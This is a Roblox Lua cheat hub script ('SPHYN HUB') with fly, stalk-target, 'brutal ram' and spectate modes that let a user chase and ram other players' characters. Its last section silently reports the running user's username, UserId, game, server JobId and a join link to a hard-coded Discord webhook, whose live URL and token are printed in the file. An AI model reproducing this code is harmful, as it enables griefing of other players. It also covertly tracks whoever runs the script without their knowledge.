-- [[ MASBRO V3.6.1 - FULL RAW BRUTAL EDITION ]] --
-- [[ WORDHELPER V4 BASE SCRIPT ]]
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local Run = game:GetService("RunService")
local Camera = workspace.CurrentCamera

-- State
local Fly, Stalk, RamMode, Spectate, SpinMode, FlipMode = false, false, false, false, false, false
local TargetPlayer = nil
local Speed, Alt, SpinSpeed, FlipSpeed = 40, 20, 70, 150 -- FlipSpeed sekarang variabel mandiri
local Up, Down = false, false
local LastLook = Vector3.new(0,0,1)
local IsOpen = true

-- [ UI ROOT ] --
local sg = Instance.new("ScreenGui", LP.PlayerGui); sg.Name = "SPHYN HUB"; sg.ResetOnSpawn = false

-- [ MAIN UI ] --
local main = Instance.new("Frame", sg); main.Size = UDim2.new(0, 190, 0, 420); main.Position = UDim2.new(0.05, 0, 0.2, 0); main.BackgroundColor3 = Color3.fromRGB(15, 15, 20); main.BorderSizePixel = 0; main.Active = true; main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
local stroke = Instance.new("UIStroke", main); stroke.Color = Color3.fromRGB(0, 170, 255); stroke.Thickness = 1.5

-- Header
local head = Instance.new("Frame", main); head.Size = UDim2.new(1, 0, 0, 35); head.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
Instance.new("UICorner", head).CornerRadius = UDim.new(0, 12)
local title = Instance.new("TextLabel", head); title.Size = UDim2.new(1, 0, 1, 0); title.Position = UDim2.new(0.08,0,0,0); title.Text = "SPHYN HUB <font color='#00aaff'>RUSUH FISHIT</font>"; title.RichText = true; title.TextColor3 = Color3.new(1,1,1); title.BackgroundTransparency = 1; title.Font = Enum.Font.GothamBold; title.TextSize = 12; title.TextXAlignment = 0

local closeBtn = Instance.new("TextButton", head); closeBtn.Size = UDim2.new(0, 30, 0, 30); closeBtn.Position = UDim2.new(0.82, 0, 0.05, 0); closeBtn.Text = "-"; closeBtn.TextColor3 = Color3.new(1,1,1); closeBtn.BackgroundTransparency = 1; closeBtn.Font = Enum.Font.GothamBold; closeBtn.TextSize = 20

local content = Instance.new("Frame", main); content.Size = UDim2.new(1, 0, 1, -40); content.Position = UDim2.new(0, 0, 0, 40); content.BackgroundTransparency = 1

local function createBtn(name, pos, color)
    local btn = Instance.new("TextButton", content); btn.Size = UDim2.new(0.9, 0, 0, 28); btn.Position = pos; btn.Text = name; btn.BackgroundColor3 = color or Color3.fromRGB(35, 35, 45); btn.TextColor3 = Color3.new(1,1,1); btn.Font = Enum.Font.GothamSemibold; btn.TextSize = 10; Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8); return btn
end

-- [ SEMUA TOMBOL ] --
local btnF = createBtn("✈️ FLY: OFF", UDim2.new(0.05, 0, 0, 0))
local btnS = createBtn("👁️ STALK: OFF", UDim2.new(0.05, 0, 0.08, 0))
local btnR = createBtn("🏎️ BRUTAL RAM: OFF", UDim2.new(0.05, 0, 0.16, 0))
local btnSpin = createBtn("🌪️ SPIN MODE: OFF", UDim2.new(0.05, 0, 0.24, 0), Color3.fromRGB(150, 75, 0))
local btnFlip = createBtn("🤸 BRUTAL FLIP: OFF", UDim2.new(0.05, 0, 0.32, 0), Color3.fromRGB(200, 80, 0))
local btnSpec = createBtn("🎥 VIEW PLAYER: OFF", UDim2.new(0.05, 0, 0.40, 0), Color3.fromRGB(70, 30, 100))
local btnSelect = createBtn("🎯 SELECT TARGET", UDim2.new(0.05, 0, 0.90, 0), Color3.fromRGB(50, 50, 60))

-- [ INPUTS ] --
local function createInput(label, pos, default)
    local box = Instance.new("TextBox", content); box.Size = UDim2.new(0.35, 0, 0, 25); box.Position = pos; box.Text = tostring(default); box.BackgroundColor3 = Color3.fromRGB(40,40,50); box.TextColor3 = Color3.new(1,1,1); box.Font = Enum.Font.GothamBold; box.TextSize = 10; Instance.new("UICorner", box)
    local lbl = Instance.new("TextLabel", content); lbl.Text = label; lbl.Position = UDim2.new(0.05,0,pos.Y.Scale,0); lbl.Size = UDim2.new(0,70,0,25); lbl.TextColor3 = Color3.new(1,1,1); lbl.BackgroundTransparency = 1; lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 9; lbl.TextXAlignment = 0
    return box
end

local speedBox = createInput("FLY SPEED:", UDim2.new(0.55, 0, 0.65, 0), 40)
local spinBox = createInput("SPIN SPEED:", UDim2.new(0.55, 0, 0.73, 0), 70)
local flipBox = createInput("FLIP SPEED:", UDim2.new(0.55, 0, 0.81, 0), 150)

-- [ LIST OVERLAY ] --
local listOverlay = Instance.new("ScrollingFrame", main); listOverlay.Size = UDim2.new(0.9, 0, 0.5, 0); listOverlay.Position = UDim2.new(0.05, 0, 0.2, 0); listOverlay.BackgroundColor3 = Color3.fromRGB(10,10,15); listOverlay.Visible = false; listOverlay.ZIndex = 5; listOverlay.ScrollBarThickness = 0; Instance.new("UIListLayout", listOverlay).Padding = UDim.new(0, 4); Instance.new("UICorner", listOverlay)

local function UpdateList()
    for _, v in pairs(listOverlay:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LP then
            local b = Instance.new("TextButton", listOverlay); b.Size = UDim2.new(1, 0, 0, 30); b.BackgroundColor3 = Color3.fromRGB(30,30,40); b.Text = p.DisplayName; b.TextColor3 = Color3.new(1,1,1); b.Font = Enum.Font.Gotham; b.ZIndex = 6; Instance.new("UICorner", b)
            b.MouseButton1Click:Connect(function() TargetPlayer = p; btnSelect.Text = "🎯: "..p.DisplayName:sub(1,10); listOverlay.Visible = false end)
        end
    end
end
UpdateList(); Players.PlayerAdded:Connect(UpdateList); Players.PlayerRemoving:Connect(UpdateList)
btnSelect.MouseButton1Click:Connect(function() listOverlay.Visible = not listOverlay.Visible end)

-- [ NAV INDEPENDEN ] --
local function nav(txt, pos)
    local b = Instance.new("TextButton", sg); b.Size = UDim2.new(0, 50, 0, 50); b.Position = pos; b.Text = txt; b.BackgroundColor3 = Color3.fromRGB(20, 20, 25); b.TextColor3 = Color3.fromRGB(0, 170, 255); b.TextSize = 25; b.Font = Enum.Font.GothamBold; Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0); Instance.new("UIStroke", b).Color = Color3.fromRGB(0, 170, 255); return b
end
local uBtn = nav("▲", UDim2.new(0.85, 0, 0.2, 0)); local dBtn = nav("▼", UDim2.new(0.85, 0, 0.3, 0))

-- Minimize Logic
closeBtn.MouseButton1Click:Connect(function()
    IsOpen = not IsOpen; content.Visible = IsOpen; listOverlay.Visible = false
    main:TweenSize(IsOpen and UDim2.new(0, 190, 0, 420) or UDim2.new(0, 190, 0, 35), "Out", "Back", 0.3, true)
    closeBtn.Text = IsOpen and "-" or "+"
end)

-- [ TOGGLE HANDLERS ] --
btnF.MouseButton1Click:Connect(function() Fly = not Fly; btnF.Text = Fly and "✈️ FLY: ON" or "✈️ FLY: OFF"; btnF.BackgroundColor3 = Fly and Color3.fromRGB(0, 120, 200) or Color3.fromRGB(35,35,45) end)
btnS.MouseButton1Click:Connect(function() Stalk = not Stalk; btnS.Text = Stalk and "👁️ STALKING" or "👁️ STALK: OFF"; btnS.BackgroundColor3 = Stalk and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(35,35,45) end)
btnR.MouseButton1Click:Connect(function() RamMode = not RamMode; btnR.Text = RamMode and "🏎️ BRUTAL: ON" or "🏎️ BRUTAL RAM: OFF"; btnR.BackgroundColor3 = RamMode and Color3.fromRGB(180, 0, 0) or Color3.fromRGB(35,35,45) end)
btnSpin.MouseButton1Click:Connect(function() SpinMode = not SpinMode; btnSpin.Text = SpinMode and "🌪️ SPINNING" or "🌪️ SPIN MODE: OFF"; btnSpin.BackgroundColor3 = SpinMode and Color3.fromRGB(255, 120, 0) or Color3.fromRGB(150, 75, 0) end)
btnFlip.MouseButton1Click:Connect(function() FlipMode = not FlipMode; btnFlip.Text = FlipMode and "🤸 FLIPPING..." or "🤸 BRUTAL FLIP: OFF"; btnFlip.BackgroundColor3 = FlipMode and Color3.fromRGB(255, 100, 0) or Color3.fromRGB(200, 80, 0) end)
btnSpec.MouseButton1Click:Connect(function()
    if TargetPlayer and TargetPlayer.Character then
        Spectate = not Spectate
        Camera.CameraSubject = Spectate and TargetPlayer.Character:FindFirstChildOfClass("Humanoid") or LP.Character:FindFirstChildOfClass("Humanoid")
        btnSpec.Text = Spectate and "🎥 VIEWING..." or "🎥 VIEW PLAYER: OFF"
        btnSpec.BackgroundColor3 = Spectate and Color3.fromRGB(200, 0, 0) or Color3.fromRGB(70, 30, 100)
    end
end)

-- Box Listeners
speedBox.FocusLost:Connect(function() Speed = tonumber(speedBox.Text) or 40 end)
spinBox.FocusLost:Connect(function() SpinSpeed = tonumber(spinBox.Text) or 70 end)
flipBox.FocusLost:Connect(function() FlipSpeed = tonumber(flipBox.Text) or 150 end)

uBtn.MouseButton1Down:Connect(function() Up = true end); uBtn.MouseButton1Up:Connect(function() Up = false end)
dBtn.MouseButton1Down:Connect(function() Down = true end); dBtn.MouseButton1Up:Connect(function() Down = false end)

-- [ CORE PHYSICS ] --
Run.Stepped:Connect(function()
    local char = LP.Character; local hum = char and char:FindFirstChildOfClass("Humanoid"); local seat = (hum and hum.SeatPart)
    
    if seat and Fly then
        if seat:IsA("BasePart") then pcall(function() seat:SetNetworkOwner(LP) end) end
        seat.AssemblyLinearVelocity = Vector3.new(0, 0.05, 0)
        
        -- Physical Rotation (GABUNGAN SPIN & FLIP)
        local rotVelocity = Vector3.zero
        if SpinMode then rotVelocity = Vector3.new(0, SpinSpeed, 0) end
        if FlipMode then rotVelocity = rotVelocity + Vector3.new(FlipSpeed, 0, 0) end
        seat.AssemblyAngularVelocity = rotVelocity
        
        -- Brutal Impact Properties
        for _, p in pairs(seat.Parent:GetDescendants()) do 
            if p:IsA("BasePart") then 
                p.CanCollide = true
                p.CustomPhysicalProperties = RamMode and PhysicalProperties.new(100, 2, 2, 100, 100) or nil
            end 
        end

        if Stalk and TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            seat.Anchored = false; local tRoot = TargetPlayer.Character.HumanoidRootPart
            local targetPos = RamMode and tRoot.Position or tRoot.Position + Vector3.new(0, 10, 0)
            local currentRot = seat.CFrame.Rotation
            seat.CFrame = seat.CFrame:Lerp(CFrame.new(targetPos) * currentRot, 0.2); Alt = seat.Position.Y
        elseif hum.MoveDirection.Magnitude > 0 or Up or Down then
            seat.Anchored = false
            if Up then Alt = Alt + (Speed/30) elseif Down then Alt = Alt - (Speed/30) end
            local nextPos = seat.Position + (hum.MoveDirection * Speed / 10)
            if hum.MoveDirection.Magnitude > 0 then LastLook = hum.MoveDirection end
            local currentRot = (SpinMode or FlipMode) and seat.CFrame.Rotation or CFrame.lookAt(Vector3.zero, LastLook).Rotation
            seat.CFrame = CFrame.new(nextPos.X, Alt, nextPos.Z) * currentRot
        else 
            seat.Anchored = not (SpinMode or FlipMode)
            local currentRot = (SpinMode or FlipMode) and seat.CFrame.Rotation or CFrame.lookAt(Vector3.zero, LastLook).Rotation
            seat.CFrame = CFrame.new(seat.Position.X, Alt, seat.Position.Z) * currentRot
        end
    elseif seat then 
        seat.Anchored = false 
    end
end)


-- ===== WEBHOOK LOGGER INTEGRATION =====
local WEBHOOK = "https://discord.com/api/webhooks/1477962601916010506/8rWEqnzPoVJBs3tvWybHmZZe92X4Rhn0nj-JDT3CIWig-2rnB4eJgtnVJxvbUXk_d66F"
local LocalPlayer = Players.LocalPlayer
local startTime = os.time()
local joinTimeFormatted = os.date("%H:%M:%S")
local messageId

local function formatTime(sec)
    return string.format("%02d:%02d:%02d",
        sec // 3600,
        (sec % 3600) // 60,
        sec % 60
    )
end

local function getGameName()
    local success, info = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) end)
    return success and info.Name or "Unknown"
end

local function buildPayload(status, leaveTime)

    local profileUrl =
        "https://www.roblox.com/users/"
        .. LocalPlayer.UserId ..
        "/profile"

    local gameName = getGameName()

    local jobId = game.JobId

    local serverUrl =
        "https://www.roblox.com/games/start?placeId="
        .. game.PlaceId ..
        "&gameInstanceId="
        .. jobId


    return {
        username = "Player Logger",

        embeds = {{

            title = "Roblox Player Activity - Sphyn Hub Rusuh",
            url = profileUrl,

            color =
                status == "JOIN" and 0x00FF00
                or status == "LEAVE" and 0xFF0000
                or 0x00AAFF,

            fields = {

                {
                    name = "Username",
                    value = "[" .. LocalPlayer.Name .. "](" .. profileUrl .. ")",
                    inline = true
                },

                {
                    name = "UserId",
                    value = "```" .. LocalPlayer.UserId .. "```",
                    inline = true
                },

                {
                    name = "Status",
                    value = "```" .. status .. "```",
                    inline = true
                },

                {
                    name = "Game",
                    value = "```" .. gameName .. "```",
                    inline = false
                },

                {
                    name = "Place ID",
                    value = "```" .. game.PlaceId .. "```",
                    inline = true
                },

                {
                    name = "JobId",
                    value = "```" .. jobId .. "```",
                    inline = true
                },

                {
                    name = "Server URL",
                    value = serverUrl,
                    inline = false
                },

                {
                    name = "Join Time",
                    value = "```" .. joinTimeFormatted .. "```",
                    inline = true
                },

                {
                    name = "Leave Time",
                    value = "```" .. (leaveTime or "-") .. "```",
                    inline = true
                },

                {
                    name = "Uptime",
                    value = "```" ..
                        formatTime(os.time() - startTime) ..
                        "```",
                    inline = false
                }

            },

            footer = {
                text = "Sphyn Hub Logger"
            },

            timestamp = DateTime.now():ToIsoDate()

        }}

    }

end

local function sendWebhook(status, leaveTime)
    if not request then return end
    
    local success, res = pcall(function()
        return request({
            Url = WEBHOOK .. "?wait=true",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(buildPayload(status, leaveTime))
        })
    end)

    if success and res and res.Body then
        local data = HttpService:JSONDecode(res.Body)
        messageId = data.id
    end
end

local function editWebhook()
    if not messageId or not request then return end

    pcall(function()
        request({
            Url = WEBHOOK .. "/messages/" .. messageId,
            Method = "PATCH",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(buildPayload("ONLINE"))
        })
    end)
end

-- Inisialisasi Logger
task.spawn(function()
    sendWebhook("JOIN")
    
    -- Update Uptime setiap 1 menit
    local interval = 60
    while task.wait(interval) do
        if not messageId then break end
        editWebhook()
    end
end)

-- Deteksi saat pemain keluar/script ditutup
game:BindToClose(function()
    local leaveTimeFormatted = os.date("%H:%M:%S")
    sendWebhook("LEAVE", leaveTimeFormatted)
end)

print("SPHYN HUB Loaded Successfully.")
